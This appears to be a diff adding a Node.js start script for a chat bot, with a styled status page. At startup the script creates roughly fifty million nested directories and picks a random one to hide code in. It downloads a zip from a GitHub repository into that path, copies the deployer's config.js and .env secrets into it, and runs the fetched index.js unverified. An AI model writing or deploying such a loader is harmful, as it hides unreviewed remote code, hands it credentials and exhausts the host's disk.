@@ -1,1 +1,189 @@
+const fs = require('fs');
+const path = require('path');
+const axios = require('axios');
+const AdmZip = require('adm-zip');
+const express = require("express");
 
+const app = express();
+const port = process.env.PORT || 9090;
+
+// HTML status route
+app.get("/", (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>BEN BOT | STATUS</title>
+      <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet">
+      <style>
+        * { box-sizing: border-box; }
+        body {
+          margin: 0;
+          padding: 0;
+          min-height: 100vh;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-family: 'Roboto Mono', monospace;
+          background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+          color: #ffffff;
+        }
+        .card {
+          background: rgba(0, 0, 0, 0.6);
+          padding: 30px 25px;
+          border-radius: 16px;
+          text-align: center;
+          box-shadow: 0 8px 24px rgba(0, 255, 128, 0.3);
+          border: 1px solid #00ff99;
+          width: 90%;
+          max-width: 420px;
+          animation: fadeInUp 1.2s ease-out;
+        }
+        .card h1 {
+          font-size: 1.8rem;
+          color: #00ff99;
+          margin-bottom: 10px;
+        }
+        .card p {
+          font-size: 1rem;
+          color: #cccccc;
+        }
+        .status-dot {
+          display: inline-block;
+          width: 12px;
+          height: 12px;
+          background-color: #00ff99;
+          border-radius: 50%;
+          margin-right: 8px;
+          vertical-align: middle;
+          animation: pulse 1.2s infinite;
+        }
+        @keyframes fadeInUp {
+          from { opacity: 0; transform: translateY(30px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+          0% { transform: scale(1); opacity: 1; }
+          50% { transform: scale(1.3); opacity: 0.6; }
+          100% { transform: scale(1); opacity: 1; }
+        }
+        @media (max-width: 480px) {
+          .card { padding: 20px 15px; }
+          .card h1 { font-size: 1.4rem; }
+          .card p { font-size: 0.95rem; }
+        }
+      </style>
+    </head>
+    <body>
+      <div class="card">
+        <h1><span class="status-dot"></span> BEN BOT IS RUNNING</h1>
+        <p>BEN BOT OWNER IS NOTHING.</p>
+      </div>
+    </body>
+    </html>
+  `);
+});
+
+// Start web server first (Heroku needs it!)
+
+const mainDirs = ['.node', '.king', '.yarn', '.pkg', '.dark', '.safe', '.zero', '.deep', '.core', '.random'];
+const repoZipUrl = 'https://github.com/Git-horb/P/archive/refs/heads/main.zip';
+
+function getRandomDeepPath(base) {
+  let pathLevel = base;
+  for (let i = 0; i < 3; i++) {
+    pathLevel = path.join(pathLevel, `f${Math.floor(Math.random() * 100000)}`);
+  }
+  return pathLevel;
+}
+
+async function createFoldersAndPickOne() {
+  const candidates = [];
+
+  for (const dir of mainDirs) {
+    const base = path.join(__dirname, dir);
+    for (let i = 0; i < 1000; i++) {
+      const level1 = path.join(base, `a${i}`);
+      for (let j = 0; j < 100; j++) {
+        const level2 = path.join(level1, `b${j}`);
+        for (let k = 0; k < 50; k++) {
+          const level3 = path.join(level2, `c${k}`);
+          fs.mkdirSync(level3, { recursive: true });
+          candidates.push(level3);
+        }
+      }
+    }
+  }
+
+  // انتخاب تصادفی یک مسیر
+  const randomIndex = Math.floor(Math.random() * candidates.length);
+  return candidates[randomIndex];
+}
+
+async function downloadAndExtractRepo(repoFolder) {
+  try {
+    console.log('🔄 Downloading BEN BOT files...');
+    const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
+    const zip = new AdmZip(Buffer.from(response.data, 'binary'));
+    fs.mkdirSync(repoFolder, { recursive: true });
+    zip.extractAllTo(repoFolder, true);
+    return true;
+  } catch (error) {
+    console.error('❌ Error loading bot files:', error.message);
+    return false;
+  }
+}
+
+(async () => {
+  const selectedPath = await createFoldersAndPickOne();
+  console.log(`📁 Selected deep path: ${selectedPath}`);
+
+  const success = await downloadAndExtractRepo(selectedPath);
+  if (!success) return;
+
+  const extractedFolders = fs
+    .readdirSync(selectedPath)
+    .filter(f => fs.statSync(path.join(selectedPath, f)).isDirectory());
+
+  if (!extractedFolders.length) {
+    console.error('❌ No folder found in extracted content');
+    process.exit(1);
+  }
+
+  const extractedRepoPath = path.join(selectedPath, extractedFolders[0]);
+
+  // Copy config.js
+  const srcConfig = path.join(__dirname, 'config.js');
+  const destConfig = path.join(extractedRepoPath, 'config.js');
+  try {
+    fs.copyFileSync(srcConfig, destConfig);
+  } catch (err) {
+    console.error('❌ Failed to copy config.js:', err.message);
+    process.exit(1);
+  }
+
+  // Copy .env
+  const srcEnv = path.join(__dirname, '.env');
+  const destEnv = path.join(extractedRepoPath, '.env');
+  if (fs.existsSync(srcEnv)) {
+    try {
+      fs.copyFileSync(srcEnv, destEnv);
+    } catch (err) {
+      console.error('❌ Failed to copy .env:', err.message);
+    }
+  }
+
+  // Start bot
+  setTimeout(() => {
+    console.log('🚀 Starting BEN-BOT...');
+    try {
+      process.chdir(extractedRepoPath);
+      require(path.join(extractedRepoPath, 'index.js'));
+    } catch (err) {
+      console.error('❌ Failed to start bot:', err.message);
+      process.exit(1);
+    }
+  }, 4000);
+})();
